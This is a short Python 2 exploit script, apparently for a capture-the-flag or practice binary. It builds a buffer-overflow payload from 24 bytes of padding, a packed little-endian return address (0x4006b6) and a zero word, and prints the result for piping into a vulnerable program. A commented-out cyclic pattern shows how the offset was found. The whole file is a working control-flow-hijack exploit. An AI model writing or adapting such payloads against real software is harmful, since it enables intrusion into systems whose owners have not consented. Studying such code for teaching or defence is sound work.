import struct
# print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"

payload = "AAAABBBBCCCCDDDDEEEEFFFF"
value = struct.pack('<I', 0x4006b6)
zero = struct.pack('<I', 0x0)
print payload+value+zero
